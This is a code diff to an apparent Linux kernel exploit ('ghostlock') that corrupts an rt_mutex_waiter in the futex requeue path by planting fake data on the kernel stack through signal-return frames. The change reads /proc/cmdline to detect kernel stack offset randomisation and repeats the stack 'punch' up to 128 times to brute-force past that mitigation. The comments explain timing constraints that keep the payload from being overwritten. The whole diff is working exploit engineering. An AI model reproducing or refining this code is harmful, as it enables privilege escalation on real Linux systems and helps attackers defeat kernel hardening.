@@ -48,6 +48,9 @@ namespace {
      * one able to touch futex_requeue()'s rt_mutex_waiter on this kernel. */
     volatile std::uint64_t g_altstack_ss_size = 0;
     volatile int g_altstack_enabled = 0;
+    /* 0 = kernel stack base is stable, 1 = randomised (or unknown).  Read once
+     * from /proc/cmdline; drives the punch repetition count. */
+    volatile int g_kstack_randomized = 0;
 
     void gl_sigret_handler(int, siginfo_t *, void *uctx) {
         auto *uc = static_cast<ucontext_t *>(uctx);
@@ -81,20 +84,37 @@ namespace {
     }
 
     /* Must be called on the waiter thread that owns the re-armed stack. */
-    bool gl_sigret_punch(const unsigned char *buf, std::size_t len) {
+    /* One-time setup, deliberately separated from the punch itself: every call
+     * here is a syscall (sigaction / pthread_sigmask / getenv-driven logging)
+     * and a syscall between the sigreturn copy and the consumer's
+     * sched_setattr() unwinds over the stack slot the punch just filled. */
+    void gl_sigret_prepare(void) {
         struct sigaction sa;
         memset(&sa, 0, sizeof(sa));
         sa.sa_sigaction = gl_sigret_handler;
         sa.sa_flags = SA_SIGINFO;
         sigemptyset(&sa.sa_mask);
-        if (sigaction(SIGUSR1, &sa, nullptr) != 0) return false;
+        if (sigaction(SIGUSR1, &sa, nullptr) != 0) return;
         sigset_t ss;
         sigemptyset(&ss);
         sigaddset(&ss, SIGUSR1);
         pthread_sigmask(SIG_UNBLOCK, &ss, nullptr);
-        g_punch_src = buf;
-        g_punch_len = len;
-        g_punch_patched = 0;
+        {
+            std::array<char, 512> cmd{};
+            int32_t fd = open("/proc/cmdline", O_RDONLY | O_CLOEXEC);
+            ssize_t n = -1;
+            if (fd >= 0) {
+                n = read(fd, cmd.data(), cmd.size() - 1);
+                close(fd);
+            }
+            g_kstack_randomized = 1;   /* conservative default */
+            if (n > 0) {
+                cmd[static_cast<size_t>(n)] = '\0';
+                const char *hit = strstr(cmd.data(), "randomize_kstack_offset");
+                if (hit && strstr(hit, "=off"))
+                    g_kstack_randomized = 0;
+            }
+        }
         if (const char *alt = getenv("GL_ALTSTACK_LOCK")) {
             g_altstack_ss_size = strtoull(alt, nullptr, 16);
             g_altstack_enabled = 1;
@@ -103,20 +123,23 @@ namespace {
         } else {
             g_altstack_enabled = 0;
         }
-        pr_info("sigret punch: raise(SIGUSR1) payload=%zu waiter_off=0x%zx\n", len,
-                (std::size_t) 0xe8);
-        support::progress_marker("punch_in");
+    }
+
+    bool gl_sigret_punch(const unsigned char *buf, std::size_t len) {
+        g_punch_src = buf;
+        g_punch_len = len;
+        g_punch_patched = 0;
+        /* Only raise() runs from here on.  On a kernel with
+         * CONFIG_RANDOMIZE_KSTACK_OFFSET the sigreturn frame lands at a random
+         * 16-byte-aligned offset, so repeating the punch covers several of the
+         * 128 possible bases; a syscall in between would erase the previous
+         * draw instead, which is why nothing else lives in this function. */
         raise(SIGUSR1);
-        /* NOTHING may run between the sigreturn copy and the consumer's
-         * sched_setattr(): the punch lands on THIS thread's kernel stack at
-         * depth 0x198 and any later syscall on this thread (even a single
-         * write() to the progress file) unwinds through the same region and
-         * overwrites the fake waiter.  A previous build marked here and the
-         * chain silently degraded to rt_mutex_waiter_equal() -> out. */
         return g_punch_patched == 1;
     }
 } // namespace
 #else
+    void gl_sigret_prepare(void) {}
     bool gl_sigret_punch(const unsigned char *, std::size_t) { return false; }
 #endif
 
@@ -126,6 +149,11 @@ namespace ghostlock::route {
      * rt_waiter.task and leaves pi_tree_entry untouched -- that is the one
      * field a later rt_mutex_dequeue_pi() will rb_erase(). */
     bool punch_stack_here(const unsigned char *buf, std::size_t len) {
+        static bool prepared = false;
+        if (!prepared) {
+            gl_sigret_prepare();
+            prepared = true;
+        }
         return gl_sigret_punch(buf, len);
     }
 
@@ -227,8 +255,33 @@ namespace ghostlock::route {
             session::g_exploit_session.race.route_delay_usec.store(0);
 
             if (use_sigret) {
-                errno = 0;
-                stamp_result = gl_sigret_punch(stamp, stamp_size) ? 0 : -1;
+                /* A kernel with CONFIG_RANDOMIZE_KSTACK_OFFSET gives every
+                 * syscall a random 16-byte-aligned stack base, so the futex
+                 * frame and the sigreturn frame no longer share S and a single
+                 * punch usually lands on dead stack.  Repeating the draw costs
+                 * one tgkill each and covers more of the 128 possible bases;
+                 * the last draw is the one the consumer sees, so the loop ends
+                 * with no syscall after it. */
+                /* One draw per 16-byte stack base the kernel can pick; 128
+                 * covers the full 0..0x7f0 range.  When the command line says
+                 * the randomisation is off (the verified PHY110 builds), a
+                 * single draw is both sufficient and identical to the
+                 * previously validated behaviour. */
+                int32_t rounds = g_kstack_randomized ? 128 : 1;
+                if (const char *r = getenv("GL_PUNCH_ROUNDS")) {
+                    const long v = strtol(r, nullptr, 10);
+                    if (v > 0 && v <= 4096) rounds = static_cast<int32_t>(v);
+                }
+                gl_sigret_prepare();
+                pr_info("sigret punch: payload=%zu rounds=%d kstack_randomized=%d\n",
+                        stamp_size, rounds, g_kstack_randomized);
+                support::progress_marker("punch_in");
+                bool any_hit = false;
+                for (int32_t draw = 0; draw < rounds; draw++) {
+                    errno = 0;
+                    if (gl_sigret_punch(stamp, stamp_size)) any_hit = true;
+                }
+                stamp_result = any_hit ? 0 : -1;
                 status.step = 61;
                 status.error_number = stamp_result == 0 ? 0 : EIO;
             } else {
